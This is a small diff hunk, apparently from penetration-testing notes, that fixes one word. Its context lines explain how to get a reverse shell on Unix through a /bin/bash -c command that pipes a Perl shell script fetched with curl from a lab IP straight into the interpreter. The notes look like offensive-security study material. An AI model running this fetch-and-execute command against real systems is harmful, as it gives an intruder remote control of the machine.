@@ -65,4 +65,4 @@ For unix machines a way to get reverse shell if have shell command execute using
 /bin/bash -c "perl <(curl http://10.11.0.x/temp/perlshell.pl)"
 The command above means you don't need to worry about uploading the shell (Is directory writable? ect) and or quotations " '
 
-Some needs to use /bin/bash -c "command" in order to be able to execute the command
+Some applications needs to use /bin/bash -c "command" in order to be able to execute the command
